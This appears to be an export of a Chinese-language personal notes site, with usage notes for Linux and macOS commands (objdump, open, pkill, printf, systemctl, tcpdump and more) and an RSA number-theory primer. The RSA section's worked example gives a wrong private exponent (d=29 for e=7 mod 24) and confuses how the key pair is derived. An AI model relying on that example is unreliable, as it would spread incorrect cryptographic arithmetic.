的信息列出。 -b bfdname , --target= bfdname 指定目标码格式。 这不是必须的， objdump 能自动识别许多格式，比如： $objdump -b oasys -m vax -h fu.o 显示 fu.o 的头部摘要信息，明确指出该文件是 Vax 系统下用 Oasys 编译器生成的目标文件。 objdump -i 将给出这里可以指定的目标码格式列表。 -C , --demangle 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外， 还使得C++函数名以可理解的方式显示出来。 --debugging , -g 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。 仅仅支持某些类型的调试信息。有些其他的格式被 readelf -w 支持。 -e , --debugging-tags 类似 -g 选项，但是生成的信息是和 ctags 工具相兼容的格式。 --disassemble , -d 从 objfile 中反汇编那些特定指令机器码的 section 。 -D , --disassemble-all 与 -d 类似，但反汇编所有 section. --prefix-addresses 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式 -E B , -E L , --endian= <big|little> 指定目标文件的小端。这个项将影响反汇编出来的指令。 在反汇编的文件没描述小端信息的时候用。 例如 S-records 。 -f , --file-headers 显示 objfile 中每个文件的整体头部摘要信息 -h , --section-headers , --headers 显示目标文件各个 section 的头部摘要信息。 -H , --help 简短的帮助信息。 -i , --info 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 -j name , --section= name 仅仅显示指定名称为 name 的 section 的信息 -l , --line-numbers 用文件名和行号标注相应的目标代码，仅仅和 -d 、 -D 或者 -r 一起使用使用 -ld 和使用 -d 的区别不是很大， 在源码级调试的时候有用，要求编译时使用了 -g 之类的调试编译选项。 -m machine , --architecture= machine 指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如 S-records )， 这个选项很有用。可以用 -i 选项列出这里能够指定的架构. --reloc , -r 显示文件的重定位入口。如果和 -d 或者 -D 一起使用，重定位部分以反汇编后的格式显示出来。 --dynamic-reloc , -R 显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 -s , --full-contents 显示指定 section 的完整内容。默认所有的非空 section 都会被显示。 -S , --source 尽可能反汇编出源代码，尤其当编译的时候指定了 -g 这种调试参数时，效果比较明显。隐含了 -d 参数。 --show-raw-insn 反汇编的时候，显示每条汇编指令对应的机器码，如不指定 --prefix-addresses ，这将是缺省选项。 --no-show-raw-insn 反汇编时，不显示汇编指令的机器码，如不指定 --prefix-addresses ，这将是缺省选项。 --start-address= address 从指定地址开始显示数据，该选项影响 -d 、 -r 和 -s 选项的输出。 --stop-address= address 显示数据直到指定地址为止，该项影响 -d 、 -r 和 -s 选项的输出。 -t , --syms 显示文件的符号表入口。类似于 nm -s 提供的信息 -T , --dynamic-syms 显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。 它显示的信息类似于 nm -D|--dynamic 显示的信息。 -V , --version 版本信息 --all-headers , -x 显示所可用的头信息，包括符号表、重定位入口。 -x 等价于 -a -f -h -r -t 同时指定。 -z , --disassemble-zeroes 一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 @file 可以将选项集中到一个文件中，然后使用这个 @file 选项载入。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-objdump.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-objdump.html"},{"title":"open","text":"打开文件等 在MacOS上用法 说明 从命令行打开文件. 默认情况下, 会使用该文件对应设置的默认打开方式打开; 如果是格式化的URL, 将打开URL 用法: open [-e] [-t] [-f] [-W] [-R] [-n] [-g] [-h] [-s <partial SDK name>][-b <bundle identifier>] [-a <application>] [-u URL] [filenames] [--args arguments] 选项: -a 使用指定的程序打开 --arch ARCH 使用给定的cpu架构类型和子类型打开 -b 使用指定的 应用程序标识符 打开 -e 使用文本编辑器打开 -t 使用默认文本编辑器打开 -f 从标准输入读取输入并使用 TextEdit 打开 -F --fresh Launches the app fresh, that is, without restoring windows. Saved persistent state is lost, excluding Untitled documents. -R, --reveal Selects in the Finder instead of opening. -W, --wait-apps Blocks until the used applications are closed (even if they were already running). --args All remaining arguments are passed in argv to the application's main() function instead of opened. -n, --new Open a new instance of the application even if one is already running. -j, --hide Launches the app hidden. -g, --background Does not bring the application to the foreground. -h, --header Searches header file locations for headers matching the given filenames, and opens them. -s For -h, the SDK to use; if supplied, only SDKs whose names contain the argument value are searched. Otherwise the highest versioned SDK in each platform is used. -u, --url URL Open this URL, even if it matches exactly a filepath -i, --stdin PATH Launches the application with stdin connected to PATH; defaults to /dev/null -o, --stdout PATH Launches the application with /dev/stdout connected to PATH; --stderr PATH Launches the application with /dev/stderr connected to PATH to --env VAR Add an enviroment variable to the launched process, where VAR is formatted AAA=foo or just AAA for a null string value.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-open.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-open.html"},{"title":"RSA算法","text":"参考: https://zhuanlan.zhihu.com/p/48249182 (RSA这个写的比较详细, 但是看着头疼, 后面有空继续看) https://www.openssl.net.cn/docs/3.html (这个是详细的中文说明, 没空看) 属于 公钥加密算法 、 非对称加密算法 模运算 模运算即求余运算。\"模\"是\"Mod\"的音译。 和模运算紧密相关的一个概念是\"同余\"。 数学上，当两个整数除以同一个正整数，若得相同余数，则二整数同余。 两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m) 读作：a同余于b模m，或者，a与b关于模m同余。例如: 26 ≡ 14 (mod 12)。 互质关系 如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。 比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。 关于互质关系，不难得到以下结论： 任意两个质数构成互质关系，比如13和61。 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。 1和任意一个自然数是都是互质关系，比如1和99。 p是大于1的整数，则p和p-1构成互质关系，比如57和56。 p是大于1的奇数，则p和p-2构成互质关系，比如17和15。 欧拉函数 思考以下问题:: 任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？） 计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。 第一种情况 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。 第二种情况 如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。 第三种情况 如果n是质数的某一个次方，即 n = p&#94;k (p为质数，k为大于等于1的整数)，则 φ ( n ) = φ ( p k ) = p k − p k − 1 比如: φ(8) = φ(2&#94;3) =2&#94;3 - 2&#94;2 = 8 -4 = 4。 这是因为只有当一个数不包含质数p(包含是指是质数p的倍数)， 才可能与n互质(因为若一个数包含质数p, 则不满足 互质关系结论 第二点). 而包含质数p的数一共有p&#94;(k-1)个，即1×p、2×p、3×p、...、p&#94;(k-1)×p, 这里可以推导: - 第一个数是1xp, 是第一个 - 第二个数是2xp, 是第二个 - \\.\\.\\. - 最后一个数是p&#94;(k-1)×p, 是第p&#94;(k-1)个 故一共有 p&#94;(k-1) 个包含p的数. 把它们去除，剩下的就是与n互质的数。 上面的式子还可以写成下面的形式: φ ( n ) = φ ( p k ) = p k − p k − 1 = p k (1 − ( 1 )/( p ) ) 可以看出，上面的第二种情况是 k=1 时的特例。 第四种情况 如果n可以分解成两个互质的整数之积: n = p1 × p2 则: φ(n) = φ(p1p2) = φ(p1)φ(p2) 即积的欧拉函数等于各个因子的欧拉函数之积。比如: φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。 这一条的证明要用到\"中国剩余定理\"，这里就不展开了，只简单说一下思路: 如果a与p1互质(a < p1)，b与p2互质(b < p2)，c与p1p2互质(c < p1p2)，则c与数对 (a,b) 是一一对应关系。 由于a的值有φ(p1)种可能，b的值有φ(p2)种可能，则数对 (a,b) 有φ(p1)φ(p2)种可能，而c的值有φ(p1p2)种可能， 所以φ(p1p2)就等于φ(p1)φ(p2)。 第五种情况 因为任意一个大于1的正整数，都可以写成一系列质数的积 n = p k 1 1 p k 2 2 ... p kr r 根据 第四种情况 结论，得到 φ ( n ) = φ ( p k 1 1 ) φ ( p k 2 2 )... φ ( p kr r ) 再根据 第三种情况 的结论，得到 φ ( n ) = p k 1 1 (1 − ( 1 )/( p 1 ) ) p k 2 2 (1 − ( 1 )/( p 2 ) )... p kr r (1 − ( 1 )/( p r ) ) 也就等于 φ ( n ) = n (1 − ( 1 )/( p 1 ) )(1 − ( 1 )/( p 2 ) )...(1 − ( 1 )/( p r ) ) 这就是欧拉函数的通用计算公式。比如，1323的欧拉函数，计算过程如下 φ (1323) = φ (3 3 x 7 2 ) = 1323(1 − ( 1 )/( 3 ) )(1 − ( 1 )/( 7 ) ) = 756 欧拉定理 欧拉函数的用处，在于欧拉定理。\"欧拉定理\"指的是: 如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立 a φ ( n ) ≡ 1 ( mod n ) 也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。 比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。 欧拉定理有一个特殊情况。 假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成 a p − 1 ≡ 1 ( mod p ) 这就是著名的费马小定理。它是欧拉定理的特例。 欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。 模反元素 还剩下最后一个概念： 如果两个正整数a和n互质，那么一定可以找到整数b，使得ab-1被n整除，或者说ab被n除的余数是1. 这时，b就叫做a的\"模反元素\"。 比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。 显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}， 即如果b是a的模反元素，则 b+kn 都是a的模反元素。 欧拉定理可以用来证明模反元素必然存在。 可以看到，a的 φ(n)-1 次方，就是a的模反元素。 RSA生成算法 具体来说: 选择两个大素数p和q,计算n=pq,且欧拉函数φ(n)=(p-1)(q-1) 选择与φ(n)互质的整数e,e就是公钥指数 计算d,满足ed≡1(mod φ(n)),d就是私钥指数 (n,e)就是公钥,(n,d)就是私钥 这里公钥(n,e)是从私钥(n,d)推导计算出来的,而无法由公钥反推私钥。 举个简单例子: p=5,q=7 n=5*7=35 φ(n)=(p-1)(q-1)=4*6=24 选择e=7,与24互质, 则d=7的乘法逆元mod 24=29, 则: 公钥(n=35, e=7) 私钥(n=35, d=29) 可以看出,公钥是从选择的d计算得到的e,但无法由e反推出d。 所以,RSA算法要求私钥生成公钥,而不能由公钥生成私钥,这是RSA算法的基本原理和要求。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-RSA-algorithm.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-RSA-algorithm.html"},{"title":"一些问题说明","text":"为什么RSA算法要先生成私钥, 再推导公钥 RSA说明可见: RSA生成算法 <R_RSA生成算法> 在openssl中,我们一般: 用genrsa生成RSA私钥 用rsa推导出RSA公钥 而不能: 自己选择n和e生成公钥 再由公钥反推私钥d 这违反了RSA算法的基本原理,破坏了其安全性。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Some-issues.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Some-issues.html"},{"title":"pandoc","text":"一个开源的文档转换工具, 支持多种文档格式之间的互相转换. 安装: apt install pandoc 使用举例, 将md转换为html: pandoc test.md -f markdown -t html -s -o test.html 一些常用选项: -f FORMAT, -r FORMAT --from=FORMAT, --read=FORMAT 输入文件格式 -t FORMAT, -w FORMAT --to=FORMAT, --write=FORMAT 输出文件格式, 某些支持自动通过后缀识别. -o FILE, --output=FILE 输出文件位置 -M <KEY[:VALUE]>, --metadata=KEY[:VALUE], --metadata-file=FILE --data-dir= DIRECTORY 依赖目录 -d <FILE> --defaults=FILE --file-scope --sandbox -s --standalone, 独立成一个文件? --template=FILE -V <KEY[:VALUE]> --variable=KEY[:VALUE] --wrap=auto|none|preserve --ascii --toc, --table-of-contents --toc-depth=NUMBER -N --number-sections --number-offset=NUMBERS --top-level-division=section|chapter|part --extract-media= PATH 输出图片目录, 比如将doc转换为rst时 --resource-path=SEARCHPATH -H FILE --include-in-header=FILE -B FILE --include-before-body=FILE -A FILE --include-after-body=FILE --no-highlight --highlight-style=STYLE|FILE --syntax-definition=FILE --dpi=NUMBER --eol=crlf|lf|native --columns=NUMBER -p --preserve-tabs --tab-stop=NUMBER --pdf-engine=PROGRAM --pdf-engine-opt=STRING --reference-doc= FILE 输出doc模版文件，使用模版文件转换可以把标题之类的格式搞得更规范 --self-contained --embed-resources --request-header=NAME:VALUE --no-check-certificate --abbreviations=FILE --indented-code-classes=STRING --default-image-extension=extension -F PROGRAM --filter=PROGRAM -L SCRIPTPATH --lua-filter=SCRIPTPATH --shift-heading-level-by=NUMBER --base-header-level=NUMBER --track-changes=accept|reject|all --strip-comments --reference-links --reference-location=block|section|document --markdown-headings=setext|atx --list-tables --listings -i --incremental --slide-level=NUMBER --section-divs --html-q-tags --email-obfuscation=none|javascript|references --id-prefix=STRING -T STRING --title-prefix=STRING -c URL --css=URL --epub-subdirectory=DIRNAME --epub-cover-image=FILE --epub-title-page=true|false --epub-metadata=FILE --epub-embed-font=FILE --split-level=NUMBER --chunk-template=PATHTEMPLATE --epub-chapter-level=NUMBER --ipynb-output=all|none|best -C --citeproc --bibliography=FILE --csl=FILE --citation-abbreviations=FILE --natbib --biblatex --mathml --webtex[=URL] --mathjax[=URL] --katex[=URL] --gladtex --trace --dump-args --ignore-args --verbose --quiet --fail-if-warnings --log=FILE --bash-completion --list-input-formats --list-output-formats --list-extensions[=FORMAT] --list-highlight-languages --list-highlight-styles -D FORMAT --print-default-template=FORMAT --print-default-data-file=FILE --print-highlight-style=STYLE|FILE -v --version -h --help","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pandoc.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pandoc.html"},{"title":"pgrep","text":"pgrep通过匹配其程序名, 获得正在被调度的进程的相关信息 常见选项: -l 同时显示进程名和PID -o 当匹配多个进程时，显示进程号最小的那个 -n 当匹配多个进程时，显示进程号最大的那个 注解 进程号越大，并不一定意味着进程的启动时间越晚 pgrep查找的是程序名，不包括其参数 pgrep相当于: ps –eo pid,cmd | awk ‘{print $1,$2}' | grep KeyWord","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pgrep.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pgrep.html"},{"title":"pkill","text":"类似的指令: /docs/操作系统/linux/linux指令/killall /docs/操作系统/linux/linux指令/kill 当作于管理进程时，pkill 命令和 killall 命令的用法相同， 都是通过进程名杀死一类进程，该命令的基本格式如下: [root@localhost ~]# pkill [信号] 进程名 注解 即使进程是以绝对/相对路径启动, 进程名也是直接写最终启动的那个文件名即可, 如使用 /usr/bin/top 启动了个 top , 使用 pkill -9 top 杀死 pkill 命令常用信号及其含义 信号编号 信号名 含义 0 EXIT 程序退出时收到该信息 1 HUP 挂掉电话线或终端连接的 挂起信号，这个信号也会 造成某些进程在没有终止 的情况下重新初始化 2 INT 表示结束进程，但并不是 强制性的，常用的 \"Ctrl+C\" 组合键发出 就是一个 kill -2 的信号 3 QUIT 退出。 9 KILL 杀死进程，即强制结束进程 11 SEGV 段错误 15 TERM 正常结束进程 是 kill 命令的默认信号 还可以踢出登陆用户 除此之外，pkill 还有一个更重要的功能，即按照终端号来踢出用户登录， 此时的 pkill 命令的基本格式如下: pkill [-t 终端号] 进程名 [-t 终端号] 选项用于按照终端号踢出用户 学习 killall 命令时，不知道大家发现没有，通过 killall 命令杀死 sshd 进程的方式来踢出用户， 非常容易误杀死进程，要么会把 sshd 服务杀死，要么会把自己的登录终端杀死 所以，不管是使用 kill 命令按照 PID 杀死登录进程，还是使用 killall 命令按照进程名杀死登录进程， 都是非常容易误杀死进程的，而使用 pkill 命令则不会，举个例子, 使用w命令查询本机已经登录的用户: [root@localhost ~]# w 20:06:34 up 28 min, 3 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root ttyl - 19:47 18:52 0.01s 0.01s -bash root pts/0 192.168.0.100 19:47 0.00s 0.09s 0.04s w root pts/1 192.168.0.100 19:51 14:56 0.02s 0.02s -bash 可以看出当前主机已经登录了三个root用户，一个是本地终端ttyl登录， 另外两个是从192.168.0.100登陆的远程登录 强制杀死从pts/1虚拟终端登陆的进程: [root@localhost ~]# pkill -9 -t pts/1 [root@localhost ~]# w 20:09:09 up 30 min, 2 users, load average: 0.00, 0.00,0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root ttyl - 19:47 21:27 0.01s 0.01s -bash root pts/0 192.168.0.100 19:47 0.00s 0.06s 0.00s w 虚拟终端pts/1的登录进程已经被杀死了","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkill.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkill.html"},{"title":"printf","text":"功能 不换行打印 使用 printf \"\\e[1;36;45m%s\\e[0m\\n\" \" ${ _strs } \" 拓展--关于使用颜色输出 颜色输出相关字符说明 \\e 转义起始符，定义一个转义序列， 可以使用 033代替 [ 表示开始定义颜色 1表示高亮，36表示字体颜色为天蓝，45表示背景色为红色 \"_strs\" 属于文字内容 m 转义终止符，表示颜色定义完毕 再次使用 e[ ，表示再次开启颜色定义，0表示使用默认的颜色，m表示颜色定义结束，所以 e[0m 的作用是恢复之前的配色方案 数字与颜色关系 字体颜色(前景色): 30-37 数字 颜色 0 默认 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 紫色 36 天蓝色 37 白色 字背景颜色(后景色): 40-47 数字 颜色 0 默认 40 黑色 41 红色 42 绿色 43 黄色 44 蓝色 45 紫色 46 天蓝色 47 白色 其他特殊颜色-黑底彩色 黑底彩色: 90-97 数字 颜色 90 黑 91 深红 92 绿 93 黄色 94 蓝色 95 紫色 96 深绿 97 白色 字体控制选项 字体控制选项 代码 \\033[0m 关闭所有属性 \\033[1m 设置高亮度 \\033[4m 下划线 \\033[5m 闪烁 \\033[7m 反显，撞色显示，显示为白色黑底，或者显示为黑底白字 \\033[8m 消影，字符颜色将会与背景颜色相同 \\033[nA 光标上移n行 \\033[nB 光标下移n行 \\033[nC 光标右移n行 \\033[nD 光标左移n行 \\033[y;xH 设置光标位置 \\033[2J 清屏 \\033[K 清除从光标到行尾的内容 \\033[s 保存光标位置 \\033[u 恢复光标位置 \\033[?25l 隐藏光标 \\033[?25h 显示光标 另有一个更便捷的命令 ./tput 技巧 echo的 \\e 和 \\033 一个效果","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-printf.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-printf.html"},{"title":"cp","text":"用于复制文件或目录 -a 此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容。其作用等于dpR参数组合。 -d 复制时保留链接。这里所说的链接相当于Windows系统中的快捷方式。 -f 覆盖已经存在的目标文件而不给出提示。 -i 与-f选项相反，在覆盖目标文件之前给出提示，要求用户确认是否覆盖，回答\"y\"时目标文件将被覆盖。 -p 除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。 -r 若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。 -l 不复制文件，只是生成链接文件。 -n 不覆盖已存在的文件(除非使用了-i/-f) Do not overwrite an existing file. (The -n option overrides any previous -f or -i options.) 注解 像cp, mv这种指令, 一般都是当目标位置不存在时, 就重命名, 目标位置存在且为目录时, cp/mv到这个目录下; 当目标文件存在时候, 会直接覆盖掉, 使用 -n 不覆盖.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-product.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-product.html"},{"title":"pwck","text":"检查账号文件 /etc/passwd 配置信息是否正确 会与 /etc/shadow 比对","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pwck.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pwck.html"},{"title":"reboot","text":"通知系统重启: # reboot ### 重启机器 # reboot --halt ### 停止机器 # reboot -p ### 关闭机器","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-reBoot.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-reBoot.html"},{"title":"read","text":"功能 从键盘读取输入 使用: read [-options] [ variables ] 选项 选项参数 选项 含义 -p 输入提示信息 -r 不转义读取 -n num 仅读取 num 个字符串, 而非整行 -a array 把读取的数据赋值给数组 array，从下标 0 开始。 -d delimiter 用字符串 delimiter 指定读取结束的位置，而不是一个换行符（读取到的数据不包括 delimiter）。 -e 在获取用户输入的时候，对功能键进行编码转换，不会直接显式功能键对应的字符。 -p prompt 显示提示信息，提示内容为 prompt 。 -s 静默模式（ Silent mode ），不会在屏幕上显示输入的字符。当输入密码和其它确认信息的时候，这是很有必要的。 -t seconds 设置超时时间，单位为秒。如果用户没有在指定时间内输入完成，那么 read 将会返回一个非 0 的退出状态，表示读取失败。 -u fd 使用文件描述符 fd 作为输入源，而不是标准输入，类似于重定向。 示例 #!/bin/bash tip = 'n' while [ \" ${ tip } \" ! = 'y' ] ; do read -p \"添加成功后输入 y 确认 >\" -r tip done","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-read.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-read.html"},{"title":"rename","text":"在Debian或者Ubuntu环境下使用的语法是: rename 's/stringx/stringy/' files 而在CentOS下或者RedHat下是: rename stringx stringy files rename的参数分为三部分: #stringx ： 被替换字符串 #stringy ：替换字符串 #files ：匹配的文件列表 比如批量将所有文件名中包含的 (1) 删除掉 rename 's/\\(1\\)//' *","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rename.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rename.html"},{"title":"runlevel","text":"查看当前系统运行的级别. 即, /docs/操作系统/linux/linux指令/init 的支持的值","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-runlevel.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-runlevel.html"},{"title":"service","text":"service 命令与传统的 SysVinit 和 Upstart 初始化系统相关。 较早期的 Linux 发行版（如早期的 Ubuntu、Red Hat 等）使用了这些初始化系统。 虽然许多现代 Linux 发行版已经转向使用 systemd，但它们通常仍然提供 service 命令作为向后兼容支持。 service命令可以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。 service命令的作用是去/etc/init.d目录下寻找相应的服务，进行开启和关闭等操作 要查看 service 命令是否被映射到 systemctl，可以通过检查 service 命令的实际文件类型和链接来实现: ls -l $(which service) 如果 service 命令被映射到 systemctl，输出结果可能类似于: lrwxrwxrwx 1 root root 21 Oct 13 10:10 /usr/sbin/service -> /usr/bin/systemctl 示例 开启关闭一个httpd服务: service httpd start/stop 查看系统服务的状态: service --status-all","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-service.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-service.html"},{"title":"setfattr","text":"设置文件系统对象的扩展属性 安装: apt install attr 选项: -n name , --name= name 指定拓展属性名称 -v value , --value= value 指定拓展属性的值, 与-n对应 -x name , --remove= name 移除指定的拓展属性 -h , --no-dereference Do not follow symlinks. If pathname is a symbolic link, it is not followed, but is instead itself the inode being modified. --restore= file Restores extended attributes from file. The file must be in the format generated by the getfattr command with the --dump option. If a dash ( -) is given as the file name, setfattr reads from standard input. --version Print the version of setfattr and exit. --help Print help explaining the command line options. -- End of command line options. All remaining parameters are interpreted as file names, even if they start with a dash character.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfattr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfattr.html"},{"title":"shutdown","text":"shutdown 会给系统计划一个时间关机。它可以被用于停止、关机、重启机器。shutdown 会给系统计划一个时间关机。 它可以被用于停止、关机、重启机器。 关闭机器: shutdown -p now 停止机器: shutdown -H now 在 09:35am 重启机器: shutdown -r 09:35 要取消即将进行的关机，只要输入下面的命令: shutdown -c","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-shutdown.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-shutdown.html"},{"title":"strings","text":"一般会内置, 但是像docker那种需要手动安装: apt install binutils 打印文件中可打印的字符, 可以是 文本文件（test.c） 可执行文件(test) 目标文件(test.o, 链接后可生成动态库) 动态链接库(test.so) 静态链接库(test.a) strings 命令在对象文件或二进制文件中查找可打印的字符串。 字符串是 4 个或更多可打印字符的任意序列，以换行符或空字符结束。 strings 命令对识别随机对象文件很有用。 语法: strings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ] [ File ... ] 选项 -a 或 - , 搜索整个文件，而不仅仅是数据段，以寻找可打印的字符串。 如果省略这个标志，则 strings 命令只在对象文件的初始化数据空间内寻找。 -n Number 指定最小的字符串长度（除了缺省的 4 个字符以外）。 字符串长度的最大值是 4096。这个标志与 -Number 标志相同。 -o 列出文件中每个跟随在其八进制偏移量之后的字符串。这个标志与 -t o 标志相同。 -t Format 列出从文件最开始起，每个跟随在其偏移量之后的字符串。该格式取决于用作 Format 变量的字符。 d 以十进制写下偏移量。 o 以八进制写下偏移量。 x 以十六进制写下偏移量。 注解 当 -o 和 -t Format 标志在一个命令行上多次定义，则最后指定的标志控制 strings 命令的行为。 -N umber 指定最小的字符串长度（除了缺省的 4 个字符以外）。字符串长度的最大值是 4096。这个标志与 -n Number 标志相同。 File 要搜索的二进制文件或对象文件。 注解 strings若看到同一个库的不同版本的依赖, 如: ZLIB_1.2.3.4 ZLIB_1.2.9 有以下几种可能: 此共享库同时依赖了两个不同的版本 维护不佳, 升级新版本时没有移除旧版本 误报","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-strings.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-strings.html"},{"title":"sync","text":"强制将内存中的文件缓冲内容写到磁盘。 Linux sync命令用于数据同步,sync命令是在关闭Linux系统时使用的。 Linux 系统中欲写入硬盘的资料有的时候为了效率起见，会写到 filesystem buffer 中， 这个 buffer 是一块记忆体空间，如果欲写入硬盘的资料存于此 buffer 中， 而系统又突然断电的话，那么资料就会流失了，sync 指令会将存于 buffer 中的资料强制写入硬盘中。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sync.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sync.html"},{"title":"systemctl","text":"一个systemd工具，主要负责控制systemd系统和服务管理器. systemd 是许多现代 Linux 发行版（如 Ubuntu、Fedora、Debian 等）的默认初始化系统。 systemd 采用了并行启动方式，提供了更快的启动速度和更高的灵活性。 systemctl 是 systemd 的主要命令行工具，用于控制和管理系统服务、挂载点、设备等. 它融合之前 service 和 chkconfig 的功能于一体。可以使用它永久性或只在当前会话中启用/禁用服务。 Systemd(system daemon)是一个系统管理守护进程、工具和库的集合，用于取代System V初始进程。 Systemd的功能是用于集中管理和配置类UNIX系统。 常见用法 列出所有可用单元: systemctl list-unit-files systemctl list-units 列出所有失败单元: systemctl --failed 检查某个单元是否启动: systemctl is-enabled httpd.service 检查某个服务的运行状态: systemctl status httpd.service 列出所有服务: systemctl list-unit-files --type=service 查询服务是否激活: systemctl is-active httpd 服务查看是否配置开机自启动: systemctl is-enabled <service-name> 服务配置开机自启动(禁用+启用): systemctl disable httpd systemctl enable httpd 使用systemctl命令杀死服务: systemctl kill httpd 列出系统的各项服务，挂载，设备等: systemctl list-unit-files --type 获得系统默认启动级别和设置默认启动级别: systemctl get-default systemctl set-default multi-user.target 启动运行等级: systemctl isolate multiuser.target 重启、停止，挂起、休眠系统等: systemctl reboot systemctl halt systemctl suspend systemctl hibernate systemctl hybrid-sleep","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-systemctl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-systemctl.html"},{"title":"tcpdump","text":"一款sniffer工具，是Linux上的抓包工具，嗅探器 文字接口的封包抓取 一个功能强大的命令行数据包分析器，它是通过监听服务器的网卡来获取数据包， 所有通过网络访问的数据包都能获取到。 它也提供了过滤器的功能，可以获取指定的网络、端口或协议的数据包 选项 -a 尝试将网络和广播地址转换成名称； -c <count> count表示数据包数目. 抓取数据包的数量达到count后结束命令，如果不使用-c 参数，会不停的抓取数据包，直到手动停止 -C <file_size> 抓取数据包保存到文件时，通过该命令指定文件的大小。 文件达到指定大小后，会创建一个在原文件名称后面加上序号的新文件，如：dump.txt，dump.txt1。 file_size的单位是b -d 把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出； -d d 把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出； -d dd 把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出； -D 列出服务器所有网卡。 tcpdump默认监听的是编号最小的那个网卡，一般是eth0。 在进行抓包时可以通过 -i 参数指定监听的网卡，any表示监听所有网卡 -e 在每列倾倒资料上显示连接层级的文件头； -f 用数字显示网际网络地址； -F <表达文件> 指定内含表达方式的文件； -i <interface> 指定监听的网卡名称，any表示监听所有的网卡; 如eth0； -l 使用标准输出列的缓冲区； -n 